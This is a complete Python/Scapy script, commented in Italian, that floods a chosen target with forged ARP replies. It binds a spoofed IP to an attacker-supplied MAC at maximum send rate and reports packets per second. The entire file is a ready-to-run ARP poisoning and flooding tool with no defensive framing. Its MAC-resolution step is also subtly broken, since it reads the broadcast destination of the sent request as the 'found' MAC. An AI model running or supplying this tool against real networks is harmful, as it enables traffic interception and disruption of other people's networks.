#!/usr/bin/env python3

import sys
import time
from scapy.all import *

def flood_arp(iface, target_ip, spoof_mac, spoof_ip, count):
    """
    Invia pacchetti ARP Reply falsificati alla massima velocità possibile.
    """
    print(f"--- Configurazione Flood ---")
    print(f"Interfaccia: {iface}")
    print(f"Target IP: {target_ip}")
    print(f"Spoof IP: {spoof_ip} -> Spoof MAC: {spoof_mac}")
    print(f"Pacchetti totali: {count}")
    print("----------------------------")

    # 1. Risoluzione MAC Destinatario
    print("[*] Risoluzione MAC destinatario in corso...")
    try:
        # Timeout breve, se non risponde usiamo broadcast
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip),
                         timeout=2, iface=iface, verbose=False)
        if ans:
            target_mac = ans[0][0].dst
            print(f"[+] MAC Destinatario trovato: {target_mac}")
        else:
            raise IndexError
    except Exception:
        target_mac = "FF:FF:FF:FF:FF:FF"
        print(f"[!] MAC non trovato. Utilizzo BROADCAST ({target_mac})")

    # 2. Costruzione del Pacchetto (UNA VOLTA SOLA)
    # Costruire il pacchetto fuori dal ciclo è fondamentale per le prestazioni
    eth = Ether(dst=target_mac, src=spoof_mac)
    arp = ARP(op=2, psrc=spoof_ip, hwsrc=spoof_mac, pdst=target_ip)
    packet = eth / arp

    # 3. Flood
    print(f"\n[!!!] AVVIO FLOOD ARP: {count} pacchetti...")
    start_time = time.time()

    # sendp con inter=0 e loop=0 è il metodo più veloce in Scapy puro
    sendp(packet, iface=iface, count=count, inter=0, verbose=False)

    end_time = time.time()
    duration = end_time - start_time
    pps = count / duration if duration > 0 else 0

    print(f"\n[OK] Flood completato.")
    print(f"Tempo totale: {duration:.4f} secondi")
    print(f"Velocità media di invio: {pps:.2f} PPS (Pacchetti Per Secondo)")

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(f"Uso: sudo python3 {sys.argv[0]} <iface> <target_ip> <spoof_mac> <spoof_ip> <count>")
        sys.exit(1)

    iface = sys.argv[1]
    target_ip = sys.argv[2]
    spoof_mac = sys.argv[3]
    spoof_ip = sys.argv[4]
    try:
        count = int(sys.argv[5])
    except ValueError:
        print("Il conteggio deve essere un numero intero.")
        sys.exit(1)

    flood_arp(iface, target_ip, spoof_mac, spoof_ip, count)